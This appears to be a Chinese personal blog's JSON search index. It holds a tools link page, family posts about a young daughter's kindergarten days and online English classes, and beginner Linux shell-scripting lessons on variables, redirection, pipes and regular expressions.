{"pages":[{"title":"categories","text":"","link":"/categories/index.html"},{"title":"schedule","text":"","link":"/schedule/index.html"},{"title":"Tools","text":"工作常用Web链接 小工具 说明 Json.cn Json解析 MyFlash 美团点评公司技术工程部开发维护的一个回滚DML操作的工具 binlog2sql MySQL数据库闪回工具 MySQL MySQL数据库软件 Percona XtraBackup PerconaXtrabackup工具 percona-toolkit percona-toolkit percona-toolkit-bug 对Percona Toolkit进行故障排除以及如何报告错误 epel epel源 数据库工作软件 软件 说明 MySQLWorkbench MySQL数据库客户端 Xshell Linux服务器远程连接 Typora 文档编写 Notepad++ SQL开发 keepass2 密码管理 picpick 截图软件 Git Git代码管理 pycharm Python IDE python Python jdk 大数据开发-java odpscmd 大数据开发-odpscmd MaxCompute Studio 大数据开发-MaxCompute Studio是IntelliJ IDEA平台上的一套插件 MarkDown帮助 基本语法 数学公式 画图 Git帮助 史上最浅显易懂的Git教程 Keepass帮助 KeePass通过坚果云WebDav同步方法 KeePass+KeePassHTTP+chromeIPass实现密码管理 从入门到熟练：KeePass全网最详使用指南 Python开发帮助 帮助 说明 Jinja2 Jinja是一种现代且设计友好的Python模板语言，以Django模板为模型。借助可选的沙盒模板执行环境，它可以快速，广泛地使用并且安全。 Bootstrap Bootstrap 是全球最受欢迎的前端组件库，用于开发响应式布局、移动设备优先的 WEB 项目。Bootstrap 是一个用于 HTML、CSS 和 JS 开发的开源工具包。利用 Bootstrap 提供的 Sass 变量和混合（mixins）、响应式栅格系统、可扩展的预制组件以及强大的 jQuery 插件，能够让你快速地开发出产品原型或构建整个 app。 iconfont 阿里妈妈MUX倾力打造的矢量图标管理、交流平台。 设计师将图标上传到Iconfont平台，用户可以自定义下载多种格式的icon，平台也可将图标转换为字体，便于前端工程师自由调整与调用。 gojs GoJS是一个JavaScript和TypeScript库，用于构建交互式图和图。从简单的流程图和组织图到高度特定的工业图，SCADA和BPMN图，医学图（如基因图和爆发模型图），GoJS允许您为用户构建各种图和图。GoJS使用可自定义的模板和布局使构建复杂节点，链接和组的JavaScript图变得容易。GoJS提供了许多用于用户交互的高级功能，例如拖放，复制和粘贴，就地文本编辑，工具提示，上下文菜单，自动布局，模板，数据绑定和模型，事务状态和撤消管理，调色板，概述，事件处理程序，命令，用于自定义操作的可扩展工具以及可自定义的动画。我们维护着数百个示例图，为您详细介绍了交互性，模板和用户逻辑的不同示例。在评估期间，我们提供免费的开发人员对开发人员支持。 HTML HTML教程 bootstrap-api Bootstrap API","link":"/tools/index.html"},{"title":"tags","text":"","link":"/tags/index.html"}],"posts":[{"title":"向月亮说晚安","text":"摘要：今天中午讲了一个关于「晚安，月亮」的睡前故事，最后猫头鹰对月亮说了晚安，大家今天睡前还可以和宝宝说哦，再加一些其他的动物宝宝","link":"/2018/09/10/amy_life/2018-09-10-amy/"},{"title":"家长会","text":"摘要：幼儿园开学第10天，宝宝们逐渐稳定，融入这个大家庭，今天老师和我们分享宝宝们的幼儿园日常生活，以及我们对我们家长的一些建议，非常地用心。 Previous Next","link":"/2018/09/19/amy_life/2018-09-19-amy/"},{"title":"宝宝们开始漱口了","text":"摘要：今天开始我们让宝宝们开始漱口了，所以回家也要继续保持这个好习惯哦～ 君君老师语录 各位亲们，通过昨天的家长会，我们看到了家长回去的努力，今天午饭明显进步的宝宝有：@张瑾安妈妈 @操梓桐妈妈 @但颐宸妈妈 @何晟睿妈妈 @张恬觅妈妈 @严魏慈妈妈 @王晟宁妈妈 ，其他宝宝们继续加油哦～ 吃饭我们是和孩子们说：小汽车装装满，转弯送到山洞里，滑滑梯滑到肚子里，因为很多宝宝勺子不对着嘴巴，所以饭宝宝掉在桌子上都哭了。 另外，今天我们练习了宝宝们排队走楼梯，大多数已经像模像样的了，上下楼梯靠右走了，今天的运动量有点大，所以估计宝贝们今晚又要早早睡觉了.今天开始我们让宝宝们开始漱口了，所以回家也要继续保持这个好习惯哦～","link":"/2018/09/20/amy_life/2018-09-20-amy/"},{"title":"月饼烘培和小小搬运工","text":"中秋节快到了，老师带宝宝们一起做了月饼，拿去烤了，宝宝们还帮老师一起搬桌子，虽然结局差强人意，但是孩子们都很开心呢！ &lt;img src=&apos;2018-09-21-amy/01.jpg&apos; alt=&apos;...&apos;/&gt; &lt;div class=&quot;carousel-item active&quot;&gt; &lt;img src=&apos;2018-09-21-amy/02.jpg&apos; alt=&apos;...&apos;/&gt; &lt;/div&gt; &lt;div class=&quot;carousel-item active&quot;&gt; &lt;img src=&apos;2018-09-21-amy/03.jpg&apos; alt=&apos;...&apos;/&gt; &lt;/div&gt; &lt;div class=&quot;carousel-item active&quot;&gt; &lt;img src=&apos;2018-09-21-amy/04.jpg&apos; alt=&apos;...&apos;/&gt; &lt;/div&gt; &lt;div class=&quot;carousel-item active&quot;&gt; &lt;img src=&apos;2018-09-21-amy/05.jpg&apos; alt=&apos;...&apos;/&gt; &lt;/div&gt; &lt;div class=&quot;carousel-item active&quot;&gt; &lt;img src=&apos;2018-09-21-amy/06.jpg&apos; alt=&apos;...&apos;/&gt; &lt;/div&gt; &lt;div class=&quot;carousel-item active&quot;&gt; &lt;img src=&apos;2018-09-21-amy/07.jpg&apos; alt=&apos;...&apos;/&gt; &lt;/div&gt; &lt;div class=&quot;carousel-item active&quot;&gt; &lt;img src=&apos;2018-09-21-amy/08.jpg&apos; alt=&apos;...&apos;/&gt; &lt;/div&gt; &lt;div class=&quot;carousel-item active&quot;&gt; &lt;img src=&apos;2018-09-21-amy/09.jpg&apos; alt=&apos;...&apos;/&gt; &lt;/div&gt; &lt;div class=&quot;carousel-item active&quot;&gt; &lt;img src=&apos;2018-09-21-amy/20.jpg&apos; alt=&apos;...&apos;/&gt; &lt;/div&gt; &lt;div class=&quot;carousel-item active&quot;&gt; &lt;img src=&apos;2018-09-21-amy/00.jpg&apos; alt=&apos;...&apos;/&gt; &lt;/div&gt;","link":"/2018/09/21/amy_life/2018-09-21-amy/"},{"title":"宝宝们上班啦","text":"君君老师: 最近我们孩子的角色游戏慢慢进入状态了，但也有几个孩子沉迷于积木游戏无法自拔，我们希望家长们在家里也可以和孩子们一起玩角色扮演游戏， 和孩子多互动，也可以拓宽思路，可以做现实生活中不能做的，比如仙女啊，公主啊，小士兵等等 Previous Next 君君老师: 今天我们还认识了五星红旗，知道自己是一个中国人，我告诉他们过几天要给祖国妈妈过生日了，要休息七天，有孩子还反驳说不行，休息三天就够了，哈哈我还告诉他们祖国妈妈会请他们吃生日蛋糕的 午餐前还额外学了一首歌，送给我们的祖国妈妈 儿歌-祖国祖国我爱你","link":"/2018/09/29/amy_life/2018-09-29-amy/"},{"title":"国庆前学洗手","text":"今天人少，我们坐小月亮，然后给他们每人用了免洗洗手液，洗小手，国庆节出去不要忘记带哦 君君老师:他们让我发给你们 小慈的晚托班制作五星红旗","link":"/2018/09/30/amy_life/2018-09-30-amy/"},{"title":"疫情下的宝宝英语课-系列1","text":"疫情期间宝宝的英语课转成了线上，虽然效果没有现场好，但这种特殊情况下，外交老师倒着时差给孩子上课也不容易～ 英语和宝宝一起重新学习哈～ 复习单词，歌曲，对话 Previous Next 复习单词123456781. Spring ( I like spring )2. Easter ( I like Easter ) 3. Easter bunny ( I see Easter bunny ) 4. Easter eggs ( I see Easter eggs) 5. Easter chocolate ( I like Easter chocolate ) 6. Rice 米饭 Dumpling 饺子寧 Soup 汤北7. Don&apos;t play with food8. a cake , a candle , a balloon ,a party hat 歌曲12Birthday songHow is the weather song ☀️❄️☃️ 对话12345678910111213141516171819202122232425262728293031323334353637383940411. TalkWhen is your birthday  ? - My Birthday is in ... ( January ,February ,March ...) What do you want for your birthday  ?- Hello , everybody ! My name is Nataly ! I am 10 years old . My birthday is in January . I want a red sport car  for my birthday  Thank you ! 2. TalkWhat’s your favorite season ?- My favorite season is Spring !- I like Spring because I can see flowers  - I like spring because it’s sunny ☀️ - I like spring because my Birthday is in March ⭐️3. Talk”What do you do in the morning ?”- I wake up ￼- I wash my face - I brush my teeth - I comb my hair - I eat breakfast 丹  - I go to school 4. Talk- Can you see a lion 女? - Yes, I can ! - Can you see a zebra ? - No, I can’t - What do you like to eat ? - I like to eat fries  and hamburger - Do you like rice and noodles  - Yes , I do !- Do you like pizza ? - No , I don’t ! 濫 - How many horses are there ? - There are 2 horses   - How many pigs are there ? - There is one pig  画画12- When is your Birthday  ?- What do you want for your Birthday  2020-02-261234567891011121314Good evening everybody ￼Dear kids and parents, thank you all ! The first online English class was very good ! I really enjoy teaching my students ￼It is a new type of teaching for me and a new type of learning for kids ,but, I thing , we all doing great ￼I am very proud of my students ! ⭐️Today we have learnt the new topic “ Spring “ Please practice at home ✅1.Spring ( I like spring )2. Easter ( I like Easter ) 3. Easter bunny ( I see Easter bunny ) 4. Easter eggs ( I see Easter eggs) 5.Easter chocolate ( I like Easter chocolate ) Also kids can learn the poem “ Easter “ and practice reading  Feel free to send me your videos ￼Thank you all ￼ 2020-03-04123456Dear all parents： 今天我们练习了daily talk 对话部分，复习了 第三单元 并新学了 Rice 米饭 Dumpling 饺子寧 Soup 汤北Don&apos;t play with food不要玩食物在家要复习喔 2020-03-08123456789101112131415161718192021222324252627282930Good morning , PreK Star ⭐️ Thank you all ! We had a great class today ￼￼Today you have a lot of homework , kids  邏I know, that I have the smartest students ever and ‘‘this homework will help you to review and practice our daily talk and the new one topic “ Birthday party  “Lets learn : 1.Listen and sing the “ Birthday song “ 2. Practice please -“ When is your Birthday ?” -My Birthday is in ... ( January ,February ,March ...) p.s. The new one topic will help you to review the topic “ Month of s year “ And practice please : -What’s your favorite season ?-My favorite season is Spring !- I like Spring because I can see flowers  - I like spring because it’s sunny ☀️ -I like spring because my Birthday is in March ⭐️You can use these options or create new ones￼Also today we have learnt new words : a cake , a candle , a balloon ,a party hat ! I would like we add one more sentence -“ make a wish “⭐️Thank you ones again ! Stay healthy and learn English with EP School ￼￼￼Dear all parents： 今天学习了第四单元24-27页。还有月份 June、July、August 、September.新增对话--When is your Birthday ?-My Birthday is in ... (January /February /March..）Nataly老师给大家写的内容要看哈，在家要复习喔￼ 2020-03-1012345My little star ⭐️ @AmyThanks a lot for your dubbing !It is unusually perfect ￼￼ I like it so much !! You are a very industrious girl!!You have improved your pronunciation and it sound very good ￼￼Keep it up ! We are very proud of you ￼ 2020-03-111234567891011121314Dear all parents： 今天为止已经把12个月份全部学完了，其中特别是最后4个月份孩子们容易记不住，加强练习哈￼今天也复习了第四单元词汇，做了阅读！很长时间没进行阅读了，部分孩子的阅读能力有待提高￼当然我们班孩子还是非常不错滴￼ 继续加油Good job , kids ! ￼￼We had a great class today !! ￼You are well-mannered and responsible students !I like the way we learn English ￼￼It is always good atmosphere and only positive emotions ￼￼Lets Keep it up ! Practice the daily talk and do the homework please  See you all soon ￼ 2020-03-1512345678910111213Thanks a lot to the best parents and students ￼There was a great class today ￼￼ The new daily talk is excellent !! Kids speak very fluent and can give me answers for all my questions like “ When is your birthday  ?” “ What do you want for your birthday  ?”I would like we push harder on reading  Reading is very important for the young generation 邏It helps kids get to know sounds , words and language ; expand their vocabulary , make a sentence ;spark your child’s imagination ⭐️Dear parents ,I would like to say “ Thank you “ to all of you , because of your hard working , practicing and reviewing the homework  with kids ! Only in this way our kids can achieve great results in learning English ￼￼I am really grateful for your help!We appreciate your trust you have in us that you have selected our school among all for enrolling your child for a better education. We extend our thankful wishes to you and promise that we would work harder for a better development of your child.Thank you all ￼I am very happy being your teacher ‍ ￼ 2020-03-181234567891011121314151617181920Good job , Prek-Star !!Our class was amazing ! Thank you all! Keep practicing ￼￼￼We have a new daily talk ￼”What do you do in the morning ?”-I wake up ￼-I wash my face -I brush my teeth -I comb my hair -I eat breakfast 丹  -I go to school I think this daily talk is very interesting for kids and it’s also good to practice speaking ￼Dear parents , we learn this daily talk step by step 邏No worries if kids can’t say all these sentences , we will practice it step by step ￼ Thank you all! Take care and stay healthy ￼Don’t forget please about reading  Push it I am very proud of you ￼ 2020-04-0512How is the weather song ☀️❄️☃️Keep practicing ￼ 2020-03-251234567891011121314151617181920212223Pre-K Star ⭐️ you doing great !! Good job my little ✨ stars !!Let’s review our grammar !! -Can you see a lion 女? -Yes, I can ! - Can you see a zebra ? -No, I can’t [傲慢]-What do you like to eat ? - I like to eat fries  and hamburger - Do you like rice and noodles  - Yes , I do ![微笑][强]- Do you like pizza ? - No , I don’t ! 濫 -How many horses are there ? - There are 2 horses   - How many pigs are there ? - There is one pig  Thank you all !! [爱心] 2020-03-2012345678910Dear PreK -Star [太阳]Lets practice the new daily talk together ! 邏What do you do in the morning ? - I wake up -I brush my teeth -I wash my face -I comb my hair -I eat breakfast -I go to school 加油 2020-03-23123456789101112131415161718192021222324252627 Good job, my little stars ⭐️ You are learning very fast [OK]Let’s push harder on our new daily talk 邏I would like, kids, you make a project 類A poster ( with pictures, drawings , paintings ) and describe what do you do in the morning [太阳][拥抱]It will be nice I know how talented and smart you are [爱心]Deadline: March 31  Also I would like we make English flexible [拥抱]I completely agree with the meaning : “ Think over the box “ I would like my students act in this way 珞We don’t need to be concentrated on one sentence or word that we learnt , we can create new ones too [微笑]Let’s be creatorsFor example we know the verb “ wash”We know nouns -a head -hands -an apple  -etc ...( a lot of nouns from previous topics ) And we can make new sentences , like :-I wash my face in the morning [太阳]-Please , wash an apple  -I wash and comb my head .-Wash your hands before you eat [OK]Thank you all ! You are great  mhard workers !!Keep it up [太阳][爱心] 2020-04-01123456789101112131415Good job , kids You doing great !! Please review at home two topics : “ Birthday party  “ and “Good habits “Also I would like you make a presentation “ What do you want for your birthday ? “Example : Hello , everybody ! My name is Nataly ! I am 10 years old . My birthday is in January . I want a red sport car  for my birthday  Thank you ! Don’t make it complicated just practice the daily talk [太阳]@Avery爸爸 @Amy(小慈)爸爸 @Michael（颜子灏）爸爸 @Zachary(张攸宸)妈妈 You can draw a picture and describe it [偷笑]The main point is to practice :- When is your Birthday  ?- What do you want for your Birthday  Thank you  Take care [玫瑰][KeepFighting][爱心]","link":"/2020/04/02/amy_life/2020-04-01-amy/"},{"title":"疫情下的宝宝英语课-系列2","text":"作业上周老师布置的作业，Amy非常努力地练习，虽然还是很害羞哈。 12345678小渔。 2020/04/11 19:59:16通过游戏来复习英语 棒棒哒￼Nataly濾 2020/04/11 20:08:01@Amy(小慈)爸爸 it’s very fun , guys !! I like it ￼￼ Good job , parents ! Great job, Amy ! Parents , you are a good example for Amy ! One of the best ways to learn English, is to learn English in fun and natural environment￼￼ 歌曲12Nataly濾Here are wonderful songs for kids ! Let’s review our topics “ Days of the week “ “ Month of the Year “ ￼￼￼ Month of the Year Days of the week Wake up my clothes 新课程2020-04-0912Dear all parents：昨晚我们上了第六单元38-39页，练习了以前学习过的对话，并做了一些阅读￼ 在家要复习哈！Nataly老师把我们上课用到的歌曲视频都发到群里啦，在家可以放给孩子们听哈￼","link":"/2020/04/13/amy_life/2020-04-12-amy/"},{"title":"Amy经典语录-第四篇","text":"在这个新冠状病毒肆虐的日子里，有孩子的陪伴，足矣 场景1聪爸和丫丫妈妈在客厅，亲吻中，突然小慈跑到客厅。 小慈：我看到你们在相亲相爱（委屈），爸比，看我怎么教训你（生气勞） 场景2聪爸：宝贝我告诉你，我们现在不能出去玩，外面有病毒 小慈：爸比，我知道，我知道，是蝙蝠病 聪爸：你啥都知道 场景3要上班了，孩子没人带，也不想让老人来上海，于是老爸老妈决定自驾来接小慈回老家。（爱你们） 聪爸：小慈，你回老家了，会想我吗？ 小慈：不会，我只想妈妈 聪爸：啊，啊，啊，不要这样对我啊！ 场景4卫生间，小慈和聪爸正在刷牙洗脸 聪爸：小慈，如果以后有男生喜欢你，怎么办？ 小慈：那我就逃跑 聪爸：如果有很多很多男生喜欢你呢？ 小慈：那我就跑快一点。 场景5吃早饭，饭桌上 聪爸：小慈，来品尝以下爸爸的粥，这可是熬制了七七四十九天的！( •̀ ω •́ )✧ 小慈：不是四十九天，是四十九年~","link":"/2020/04/06/amy_life/2020-02-07-amy/"},{"title":"LINUX Shell Scripts 第一课 简介和变量","text":"教学环境介绍 client rhel7.2 172.25.0.10 server rhel7.2 172.25.0.11 如果真的想走IT这条路，想真正管理好你的主机，那么学习自动化管理工具Shell Scripts 非常重要！ 就是将一些命令放在一起去执行，并且不需要编译就能执行，很方便，所以在日常工作中可以用shell scripts来简化我们的管理。可以但到我们linux中，很多服务的启动都是透过shell脚本来启动的。 如果你不会脚本，那么服务器出问题的时候，真的会求助无门，所以好好地学习吧！ shell 简介什么是 shellShell 是一个命令解释器 , 是人与操作系统之间的桥梁。 我们平时无论任何操作 , 最终都要操作硬件 , 比如输入一个字符 “ a ”, 那么信号 首先会从键盘传递到主板 , 通过主板总线传递到内存 ,CPU, 显卡等 , 最终经过显卡的运 算完成后在屏幕的某个位置 , 显示一个特定字体的字符 “a ”, 这一整个过程可以说是 不断的和硬件打交道了 , 但是如果让人去发送这些硬件操作码显然不适合 , 因为这不是人干 的事 , 所以我们有了操作系统 , 操作系统通过加载一定的硬件驱动 , 从而控制硬件 , 操作硬 件 , 那剩下的事就是如何和操作系统通信了 , 对于普通的系统管理员来说 , 这也是一件非常 困难的事 , 为了方便人和操作系统沟通 , 我们开发了 shell 。 Shell 可以将我们平时运行的一些指令解释给操作系统执行 , 方便管理员操作系统。 而 Shell 的脚本其实是一种命令的堆积 , 我们将所有需要执行的命令 , 以从上至下的方 式写在一个文件当中 , 交给 shell 去自动解释执行。 shell 历史在 AT&amp;T 的 Dennis Ritchie 和 Ken Thompson 设计 UNIXTM 的时候 , 他们想要为 用户创建一种与他们的新系统交流的方法。 那时的操作系统带有命令解释器。命令解释器接受用户的命令 , 然后解释它们 , 因而计 算机可以使用这些命令。 但是 Ritchie 和 Thompson 想要的不只是这些功能 , 他们想提供比当时的命令解释器 具备更优异功能的工具。这导致了 Bourne shell( 通称为 sh) 的开发 , 由 S.R. Bourne 创 建。自从 Bourne shell 的创建 , 其它 shell 也被一一开发 , 如 C shell(csh) 和 Korn shell(ksh) 。 当自由软件基金会想寻求一种免费的 shell, 开发者们开始致力于 Bourne shell 以及当 时其它 shell 中某些很受欢迎的功能背后的语言。 这个开发结果是 Bourne Again Shell, 或称 bash 。虽然你的 Red Hat Linux 包括几 种不同的 shell,bash 是为互动用户提供的默认 shell 。 常见的 shell Bourne shell 即 sh:AT&amp;T 贝尔实验室编写的一个交换式的命令解释器。 C Shell :Bill Joy 于 20 世纪 80 年代早期开发。为了让用户更容易的使用 , 他把语法 结构变成了 C 语言风格。它新增了命令历史、别名、文件名替换、作业控制等功能。 korn shell (ksh) 是一个 Unix shell 。它由贝尔实验室的 David Korn 在二十世纪八十 年代早期编写。它完全向上兼容 Bourne shell 并包含了 C shell 的很多特性。 Bourne-Again Shell: bash 是一个为 GNU 项目编写的 Unix shell 。它的名字是一 系列缩写 :Bourne-Again SHell — 这是关于 Bourne shell(sh) 的一个双关语 (Bourne again / born again) 。 Bourne shell 是一个早期的重要 shell, 由 Stephen Bourne 在 1978 年前后编写 , 并同 Version 7 Unix 一起发布。 bash 则在1987 年由 Brian Fox 创造。 在 1990 年 ,Chet Ramey 成为了主要的维护者。 bash 是大多数 Linux 系统以及 Mac OS X v10.4 默认的 shell, 它能运行于大多数 Unix 风格的操作系统之上 , 甚至被移植到了 MicrosoftWindows 上的 Cygwin 和 MSYS 系统中 , 以实现 windows 的 POSIX 虚拟接口。此外 , 它也被 DJGPP 项目移植到了 MS- DOS 上。 POSIX shell :POSIX shell 与 Korn shell 非常的相似 , 当前提供 POSIX shell 的最 大卖主是 Hewlett-Packard 。 为什么 Shell 解决重复操作的作业。 节约时间 , 提高工作效率。 功能强大 , 使用简单。 123456789# 1.查看系统当中合法的shellcat /etc/shells # /etc/shells: valid login shells /bin/sh /bin/dash /bin/bash /bin/rbash 1234# 2.修改用户登录时使用的shell程序useradd batmanchsh -s /bin/sh batmangrep batman /etc/passwd useradd: Permission denied. useradd: cannot lock /etc/passwd; try again later. chsh: user &apos;batman&apos; does not exist123456789101112131415# 3.用户的登录流程![01](00_shell_variables/01.png)## 对于所有的用户HISTSIZE 500 ，对于root用户HISTSIZE 1000/etc/profile start/etc/profile end~/.bash_profile start~/.bashrc start/etc/bashrc start/etc/bashrc end~/.bashrc end~/.bash_profile end shell的变量功能什么是变量 让一个特定的字符代表不固定的内容，有点像y=ax+b,y就是变量， 用简单的字眼来代替比较复杂或者容易变动的数据，好处就是方便！ 比如系统中的MAIL和USER变量，根据当前登陆的用户而变化 对脚本的用处——例如ule考试的评分脚本，根据你们的机器号的不同，去检测不同的学生考试成绩 变量的设置、查看和取消 echo unset123456789101112131415161718192021222324252627282930313233343536373839404142 查看 echo ${MAIL} echo $MAIL 设置 变量名=变量的内容 myname=booboo myname=&quot;booboo wei&quot; 注意事项 变量命名规则： 1.由数字，字母，下划线_组成 2.不能以数字开头 3.字母区分大小写，大小写敏感 变量内容若有空格，可以使用单引号或者双引号 双引号保留特殊字符原有属性 单引号特殊字符变一般字符（纯文本） 也可使用\\跳脱字符将特殊字符变成一般字符 `指令`或$(指令)可以将指令的结果变成变量内容 取消 unset 变量名 unset myname``` #### 课堂练习 1. 设置变量myname=superman并查看变量的值； 2. 设置变量myname1=I am superman myname2=&quot;I am superman&quot; myname3=&apos;I am superman&apos;并查看所有变量的值； 3. 设置两个变量分别为name1=&quot;$myname is myname&quot;和name2=&apos;$myname is myname&apos;;并查看变量的值； 4. 设置变量kernel的值为当前系统的内核版本号； 5. 设置变量num的值为/etc/目录下所有以.conf结尾的文件的总数； 6. 取消练习中的有所变量。![02](00_shell_variables/02.png)### 变量内容的删除和替换```shell 变量设定方式 说明 ${变量#关键词} 若变量内容从头开始的数据符合『关键词』,则将符合的最短数据删除 ${变量##关键词} 若变量内容从头开始的数据符合『关键词』,则将符合的最长数据删除 ${变量%关键词} 若变量内容从尾向前的数据符合『关键词』,则将符合的最短数据删除 ${变量%%关键词} 若变量内容从尾向前的数据符合『关键词』,则将符合的最长数据删除 ${变量/旧字符串/新字符串} 若变量内容符合『旧字符串』则『第一个旧字符串会被新字符串替换』 ${变量//旧字符串/新字符串} 若变量内容符合『旧字符串』则『全部的旧字符串会被新字符串替换』 课堂练习 设置变量path=${PATH} 并查看； 设置变量path=/batman/bin:${path}:/superman/bin 并查看； 读取变量的时候将/batman/bin:及第一个冒号及之前的删除； 读取变量的时候将最后一个冒号及之前的都删除； 读取变量的时候将:/superman/bin及最后一个冒号及之后的删除； 读取变量的时候将第一个冒号及之后的都删除； 读取变量的时候将第一个sbin替换成SBIN； 读取变量的时候将所有的sbin替换成SBIN； 取消练习中的path变量。 变量的分类：局部变量和全局变量 env set export 分类标准 变量是否会被子程序所继续引用；局部变量不会；全局变量会 env 列出目前shell环境下的所有全局变量 set 查看所有变量，包括环境变量和局部变量 export 将局部变量转成全局变量 export myname 课堂练习1. 打开一个终端bash，查看该终端的pid号； 2. 设置本地变量justice1=&quot;this is local&quot;并查看; 3. 设置环境变量justice2=&quot;this is env&quot;并查看; 4. 打开子终端bash，查看该终端的pid号和ppid号； 5. 在子终端中分别查看变量justice1和justice2的值；变量读取、数组与宣告 read array declare123456789101112131415161718192021read 从键盘读取数据存入变量 read -p &quot;plz input yourname:&quot; -t 30 name 按下回车输入变量name的值，会等待30s结束array 数组的设定 A[0]=1;A[1]=2;A[2]=3 A=(1 2 3) A=(1 2 3 [50]=4) A=(1 2 3 [50]=4 5) 数组的读取 echo ${A[0]} echo ${A[@]} echo ${A[*]} * 代表的是一次取出所有的值 ,@ 代表依次取值 for i in &quot;$A[@]&quot;;do echo $i;done for i in &quot;$A[*]&quot;;do echo $i;donedeclare declare 参数 -a 将变量看成数组 -i 将变量看成整数 -r 使变量只读 x=1 y=2 sum=$(($x+$y)) 课堂练习1. 用read命令从键盘读取num变量的值，提示语句为“请输入你的机器号：”，限时间20s； 2. 设置数组S 第一位为1，第二位为2，第三十位为4，第三十一位为5，读取数组所有的值，读取数组第二位； 3. 设置变量x=1，y=2，变量sum=$x+$y，查看sum的值； 4. 宣告变量x为整数型值为1，变量y为整数型值为2,变量sum为整数型=$x+$y，查看sum的值；数据流重导向redirection何谓数据流重导向123456789101112131415161718指令执行后的结果有： exit 命令执行是否正确的返回值? 0正确；！0错误 简称 代码 符号 return 命令执行输出的正确信息 standard output stdout 1 &gt;或者&gt;&gt; 命令执行输出的错误信息 standard error output stderr 2 2&gt;或者2&gt;&gt;指令执行前的输入： 命令执行输入的信息 standard in stdin 0 &lt;或者&lt;&lt;用法总结 1&gt; :以覆盖的方法将『正确的数据』输出到指定的文件中； 1&gt;&gt;:以追加的方法将『正确的数据』输出到指定的文件中； 2&gt; :以覆盖的方法将『错误的数据』输出到指定的文件中； 2&gt;&gt;:以追加的方法将『错误的数据』输出到指定的文件中；cat 从键盘读取数据存入文件 cat &gt; /tmp/catfile 以ctrl+d结束 cat &gt; /tmp/catfile &lt; /tmp/passwd cat &gt; /tmp/catfile &lt;&lt; ENDF standard in ENDF===&gt;结束提示符 课堂练习1. 查看系统/目录下的所有文件名和属性，并记录到/tmp/file文件中； 2. 查看系统/var/目录下的所有文件名和属性，并追加记录到/tmp/file文件中； 3. 切换到student用户，在/home目录下查找文件名为.bashrc的文件是否存在； 4. 切换到student用户，在/home目录下查找文件名为.bashrc的文件，将该命令执行输出的正确信息显示到屏幕上，将该命令执行输出的错误信息放到黑洞/dev/null中； 5. 切换到student用户，在/home目录下查找文件名为.bashrc的文件，将该命令执行输出的正确信息保存到/tmp/stdout文件中并查看，将该命令执行输出的错误信息放到黑洞/dev/null中； 6. 切换到student用户，在/home目录下查找文件名为.bashrc的文件，将该命令执行输出的正确信息保存到/tmp/stdout文件中，将该命令执行输出的错误信息保存到/tmp/stderr文件中，并查看； 7. 切换到student用户，在/home目录下查找文件名为.bashrc的文件，将该命令执行输出的所有信息（正确和错误）都保存到/tmp/all中，并查看； 8. 使用cat命令从键盘读取数据helloword并覆盖/tmp/catfile文件； 9. 使用cat命令将/etc/passwd/的内容覆盖/tmp/catfile文件； 10. 使用cat命令从键盘读取数据helloword并覆盖/tmp/catfile文件，以结束提示符的方式结束；命令执行的判断依据 ; &amp;&amp; || CMD1 &amp;&amp; CMD2 如果前一个命令 (CMD1) 能够正确被执行 , 则执行后一个命令 (CMD2) CMD1 || CMD2 如果前一个命令 (CMD1) 被正确执行 , 则不执行后一个命令 (CMD2), 如果前一个命令(CMD1) 执行错误 , 则执行后一个命令 (CMD2). CMD1 ; CMD2 命令之间没有关系，从第一个开始执行，不管是否正确执行都会去执行第二个命令 课堂实验1. 创建目录/tmp/cmd,如果创建成功那么就再创建一个目录/tmp/cmd/cdm1; 2. 创建目录/tmp/cmd,如果创建失败，那么就再船舰一个目录/tmp/cmd/cmd2; 3. 不管目录/tmp/cmd是否创建成功，都会去再创建一个目录/tmp/tmpcmd;管道命令pipe123456789101112131415161718 #截取 grep cut grep bash$ /etc/passwd cut -d : -f 3 /etc/passwd#排序 sort uniq sort -t: -k3 -n /etc/passwd#统计 wc wc -l /etc/passwd#替换 xargs find /sbin/ -perm +7000|wc -l find /sbin/ -perm +7000|xargs wc -l 课堂练习： 1.找出/sbin/目录下有特殊权限的文件，并统计每个文件的行数 2.找出/sbin/目录下有特殊权限的文件，并统计有几个#减号 - 课堂练习： 1.将/home目录打包压缩后解压到/tmp目录 shell下的特殊符号# 注释符 \\ 跳脱符 | 管道 ; 连续指令的下达 ~ 家目录 $ 取用变量符 &amp; 进程控制后台运行 ! 逻辑运算非 / 根目录 &gt;,&gt;&gt; 数据流重导向 输出 &lt;,&lt;&lt; 数据流重导向 输入 &apos;&apos; 特殊字符失效 &quot;&quot; 特殊字符有效 `` 命令执行的结果 {} 命令的组合","link":"/2016/12/23/booboo_bash_shell_scripts/00_shell_variables/"},{"title":"LINUX Shell Scripts 第三课 正则表达式","text":"Regular Expression 、 regex 或 regexp, 缩写为 RE 正则表达式这个概念最初是由 Unix 中的工具软件 ( 例如 sed 和 grep) 普及开的。 通常被用来检索、替换那些符合某个规则的文本。 许多程序设计语言都支持正则表达是进行字符串操作。例如，在perl中就内建了一个功能强大的正则表达式引擎，还有java语言自带的。 起源于科学家对人类神经系统工作原理的早期研究；Ken Thompson将其应用到计算搜索算法 ，Unix之父将此引入到编辑器QED，后来的ed，最终引入grep。 概念： 正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、以及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。 什么是正则表达式 正则表达式就是记录文本规则的代码 和通配符类似,正则表达式也是用来进行文本匹配的工具,只不过比起通配符,它能更精确地描述你的需求 字符和字符串： 字符是计算机软件处理文字时最基本的单位,可能是字母,数字,标点符号,空格,换行符,汉字等等 字符串是0个或更多个字符的序列。 特点： 灵活性、逻辑性和功能性非常强； 可以迅速地用极简单的方式达到字符串的复杂控制； 对于刚接触的人来说，比较晦涩难懂。 应用程序：grep,egrep,awk,mysql,vim 特殊符号12345678910111213特殊字符 代表意义[:alnum:] 代表英文大小写字符及数字 ,0-9, A-Z, a-z[:alpha:] 代表任何英文大小写字符 , A-Z, a-z[:lower:] 代表小写字符 , a-z[:upper:] 代表大写字符 ,A-Z[:digit:] 代表数字而已 , 0-9[:xdigit:] 代表 16 进制数字 , 因此包括 : 0-9, A-F, a-f[:blank:] 代表空格键和 [Tab] 按键[:space:] 任何会产生空白的字符,包括空格键 , [Tab], CR 等等[:graph:] 除了空格键 ( 空格键和 [Tab] ) 外的其他所有按键[:cntrl:] 代表键盘上面的控制按键 , 包括 CR, LF, Tab, Del.. 等等[:print:] 代表任何可以被打印出来的字符[:punct:] 代表标点符号 (punctuation symbol) :&quot; &apos; ? ! ; : # $... 